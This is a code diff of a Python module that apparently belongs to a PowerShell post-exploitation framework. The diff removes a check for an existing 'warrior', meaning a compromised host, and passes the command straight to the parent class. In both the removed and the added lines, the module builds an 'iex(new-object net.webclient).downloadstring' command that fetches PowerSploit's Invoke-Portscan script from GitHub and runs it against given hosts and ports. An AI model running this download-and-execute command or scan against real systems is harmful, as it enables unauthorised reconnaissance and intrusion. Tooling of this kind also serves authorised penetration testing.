@@ -1,6 +1,5 @@
 from module import Module
 from termcolor import colored, cprint
-from warrior_check import exist_warrior
 
 class CustomModule(Module):
     def __init__(self):
@@ -22,14 +21,6 @@ class CustomModule(Module):
 
     # This module must be always implemented, it is called by the run option
     def run_module(self):
-        if exist_warrior(self.args["warrior"]):
-            function = "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1')"
-            function += 'Invoke-Portscan -Hosts {} -ports {}'.format(self.args["hosts"], self.args["port"])
-
-            with open('/tmp/ibs-{}'.format(self.args["warrior"]), 'a') as f:
-                f.write(function)
-
-            cprint ('[+] Done!', 'green')
-
-        else:
-            cprint ('[!] Failed... Warrior don´t found', 'red')
+        function = "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1')"
+        function += 'Invoke-Portscan -Hosts {} -ports {}'.format(self.args["hosts"], self.args["port"])
+        super(CustomModule, self).run(function)
